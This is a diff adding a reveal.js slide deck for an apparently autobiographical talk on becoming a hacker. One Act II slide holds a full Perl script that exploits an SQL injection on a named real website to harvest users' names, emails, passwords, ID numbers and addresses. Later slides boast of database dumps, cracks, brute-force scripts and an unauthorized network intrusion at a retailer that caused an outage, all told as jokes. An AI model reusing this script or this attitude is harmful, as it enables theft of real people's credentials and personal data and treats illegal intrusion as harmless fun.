@@ -1,0 +1,341 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Becoming a h4ck3r</title>
+
+		<meta name="description" content="Becoming a hacker: a tale of stubbornness ">
+		<meta name="author" content="Gonçalo Sá <goncalo05@gmail.com>">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/robot-lung.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+		<div class="line top"></div>
+	    <div class="line bottom"></div>
+	    <div class="line left"></div>
+	    <div class="line right"></div>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+
+				<section>
+
+					<h1>Becoming a <i style="font-family:Palatino Linotype, serif; color:#FF4040">h4ck3r</i></h1>
+					<h4>A tale of luck and stubbornness</h4>
+					<p>
+						<small>Created by <a href="https://github.com/GNSPS">GNSPS</a> for JORTEC - Feb '19</a></small>
+					</p>
+				</section>
+
+				<section>
+					<section>
+						<h1><i style="font-family:Palatino Linotype, serif;">Act I</i></h1>
+						<h3>The roots</h3>
+					</section>
+					<section data-state="image-slides" data-background-image="assets/Casio-fx-880P-M.jpg"></section>
+					<section data-state="image-slides" data-background-image="assets/Robot_Arena_2_Coverart.png" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/hackthissite_home.jpg" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/HF.png" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/reversing_book.jpg" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/stealing_the_network_book.jpg" data-background-size="contain"></section>
+				</section>
+
+				<section>
+					<section>
+						<h1><i style="font-family:Palatino Linotype, serif;">Act II</i></h1>
+						<h3>The mischiefs</h3>
+					</section>
+					<section>
+						<h4>cic_password_fetcher_alunos_v2.pl</h4>
+						<pre><code class="hljs" data-trim contenteditable>
+#!/usr/bin/perl
+#
+# The script fetches CIC'c user passwords from an 
+# SQL injection flaw on their main site.
+#
+use strict;
+use IO::Socket::INET;
+use Encode;
+use utf8;
+
+if((@ARGV &lt; 1) || (@ARGV &gt; 3))
+{
+	usage();
+}
+#usage() unless ((@ARGV &gt;= 2) || (@ARGV &lt;= 3));
+
+my $search_string = shift(@ARGV);
+my $filename = shift(@ARGV);
+my $port = shift(@ARGV);
+my $host = &quot;www.cic.pt&quot;;
+my $path = &quot;/default.asp?[deleted]&quot;;
+if (!$port)
+{
+	$port = 80; print &quot;\n[+] Using default HTTP port (80)\n\n&quot;;
+}
+if(!$filename)
+{
+	my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+	$year += 1900;
+	$filename = &quot;cic_alunos&quot;.$mday.&quot;.&quot;.$mon.&quot;.&quot;.$year.&quot;T&quot;.$hour.&quot;.&quot;.$min.&quot;.&quot;.$sec;
+}
+
+my $socket;
+
+my $count = 0;
+my $i = 0;
+my $temp;
+my $answer;
+binmode STDOUT, ':utf8';
+binmode OUTFILE, ':utf8';
+
+print &quot;\n[+] Writing to &quot;.$filename.&quot;.passwd\n\n&quot;;
+open(OUTFILE, &quot;&gt;&gt;&quot;.$filename.&quot;.passwd&quot;);
+
+$socket = IO::Socket::INET-&gt;new(proto=&gt;'tcp', PeerAddr=&gt;$host, PeerPort=&gt;$port);
+$socket or die &quot;\n\nCannot connect to host!\n&quot;;
+
+print &quot;\n[+] Connnected!\n\n&quot;;
+print OUTFILE &quot;[+] Starting data fetching at &quot;.localtime.&quot;\n&quot;;
+
+print $socket &quot;GET &quot;.$path.$search_string.&quot; HTTP/1.1\n&quot;;
+print $socket &quot;Host: &quot;.$host.&quot;\n&quot;;
+print $socket &quot;Accept: */*\n&quot;;
+print $socket &quot;Connection: close\n\n&quot;;
+
+while ($answer = &lt;$socket&gt;)
+{
+
+if ($answer =~ /mero:&lt;\/b&gt; (.+)/)
+{
+chomp($1);
+print &quot;[+] Nome: &quot;.$1.&quot;\n&quot;;
+print OUTFILE &quot;***\nNome: &quot;.$1.&quot;\n&quot;;
+$count++;
+}
+elsif ($answer =~ /&lt;br&gt;&lt;b&gt;&amp;nbsp;Nome:&lt;\/b&gt; (.+)/)
+{
+chomp($1);
+print &quot;[+] E-mail: &quot;.$1.&quot;\n&quot;;
+print OUTFILE &quot;E-mail: &quot;.$1;
+$count++;
+}
+elsif ($answer =~ /&lt;br&gt;&lt;b&gt;&amp;nbsp;Turma:&lt;\/b&gt; (.+)&Acirc;&ordm; (.+) -(.+)/)
+{
+chomp($1);
+chomp($2);
+print &quot;[+] Password: &quot;.$1.&quot;\n&quot;;
+print OUTFILE &quot;Password: &quot;.$1.&quot;\n&quot;;
+print &quot;[+] N&uacute;mero CIC: &quot;.$2.&quot;\n&quot;;
+print OUTFILE &quot;N&uacute;mero CIC: &quot;.$2.&quot;\n&quot;;
+print &quot;[+] Morada: &quot;.$3.&quot;\n&quot;;
+print OUTFILE &quot;Morada: &quot;.$3;
+$count += 3;
+}
+elsif ($answer =~ /&lt;br&gt;&lt;b&gt;&amp;nbsp;Email:&lt;\/b&gt; (.+)/)
+{
+print &quot;[+] BI: &quot;.$1.&quot;\n&quot;;
+print OUTFILE &quot;BI: &quot;.$1;
+$count ++;
+}
+}
+
+close($socket);
+
+$count = $count / 3;
+print &quot;\n[+] Retrieved &quot;.$count.&quot; users' login information successfully!\n\n&quot;;
+print OUTFILE &quot;\n[+] Retrieved &quot;.$count.&quot; users' login information successfully!\n\n&quot;;
+
+close(OUTFILE);
+
+exit(1);
+
+
+sub usage
+{
+    print &quot;\nUsage: cic.pl &lt;search_string&gt; [filename] [port]\n
+	&lt;search_string&gt; - String matching in the WHERE clause of SQL statement ('WHERE email LIKE search_string') \n
+	[fiename] - Filename for output file [filename].passwd (default: 'cic_alunosdd.mm.yyThh.mm.ss.passwd')\n
+	[port] - The TCP port in which http server ir running on (default: 80)\n\n&quot;;
+    exit(1);
+}
+						</code></pre>
+					</section>
+					<section data-state="image-slides" data-background-image="assets/outwitters_forum_hack.png" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/8ballpool_github.png" data-background-size="contain"></section>
+					
+					<section>
+						<h4>And lots of other stuff...</h4>
+						<ul>
+							<li>Dumps & dumps & dumps of databases 😈	</li>
+							<li>Cracks for already defeated DRM 😂</li>
+							<li>Bruteforce scripts for several services 🔨</li>
+							<li>Reverse engineer of proprietary protocols 📡</li>
+						</ul>
+					</section>
+				</section>
+
+				<section>
+					<section>
+						<h1><i style="font-family:Palatino Linotype, serif;">Act III</i></h1>
+						<h3>FNAC</h3>
+					</section>
+					<section data-state="image-slides" data-background-image="assets/fnac_vasco_da_gama.png" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/fnac_pc_exposicao.png" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/fnac-vasco-da-gama-lisboa-1_xl.jpg" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/fnac_album_preview.png" data-background-size="contain"></section>
+					<section data-state="image-slides" data-background-image="assets/c99.png" data-background-size="contain"></section>
+					
+					<section>
+						<h4>Fast-forwarding</h4>
+						<ul>
+							<li class="fragment">Found plaintext passwords of domain admin accounts both in storage and in-memory</li>
+							<li class="fragment">I was RDPing 3 boxes deep</li>
+							<li class="fragment">And <i>everything</i> was owned:
+								<ul>
+									<li>website</li>
+									<li>intranet portal</li>
+									<li>store LCD controllers 😂</li>
+									<li>databases (including details sent to SIBS ❗)</li>
+									<li>internal software repos</li>
+									<li><i>everything!</i></li>
+								</ul>
+							</li>
+							<li class="fragment" style="font-weight: bold; color: #FF4040">until . . .</li>
+						</ul>
+					</section>
+
+					<section data-background-image="assets/hell.gif">
+						<h4 style="background-color: black; color: #FF4040">All hell broke loose</h4>
+						<div style="background-color: black; color: white">
+							<p>Because while trying to persist access I DoSed some servers! 😂</p>
+							<p></p>
+							<p>Lines in cash registers kept growing and the website was down. 😱</p>
+						</div>
+					</section>
+
+					<section data-state="image-slides" data-background-image="assets/safe.jpg" data-background-size="contain"></section>
+
+					<section class="image-slides" data-state="image-slides" data-background-image="assets/big_doors_bad_locks.png" data-background-size="contain">
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<br>
+						<p>
+							<a href="https://medium.com/@GNSPS/big-doors-bad-locks-part-1-of-2-d2f33e88f87" title="Medium article">Check out the Medium article!</a>
+						</p>
+					</section>
+				</section>
+
+				<section>
+					<section>
+						<h1><i style="font-family:Palatino Linotype, serif;">Act IV</i></h1>
+						<h3>Today</h3>
+					</section>
+					<section data-state="image-slides" data-background-image="assets/ETHEREUM_NAV-BAR-LOGO.png" data-background-size="contain"></section>
+					<section  id="fragments" data-state="image-slides" data-background-image="assets/CDili_Logolockups_RGB_black_centered.png" data-background-size="contain">
+						<div class="fragment corner-ribbon top-right sticky red">
+							<a href="https://consensys.net/diligence/" style="color: white">
+								<p style="font-size: 140px">We're hiring!</p>
+								<p>https://consensys.net/diligence/</p>
+							</a>
+						</div>
+					</section>
+				</section>
+
+
+
+				<section>
+
+					<h1>Thank <i style="font-family:Palatino Linotype, serif; color:#FF4040">you</i>!</h1>
+					<br>
+					<p>
+						You can reach me at
+					</p>
+					<p>
+						<a href="https://twitter.com/GNSPS">twitter.com/GNSPS</a>
+					</p>
+					<br>
+					<p>
+						<small>Created by <a href="https://github.com/GNSPS">GNSPS</a> for JORTEC - Feb '19</a></small>
+					</p>
+				</section>
+
+				<section>
+					<h2>Hello There</h2>
+					<p>
+						reveal.js enables you to create beautiful interactive slide decks using HTML. This presentation will show you examples of what it can do.
+					</p>
+				</section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/search/search.js', async: true },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
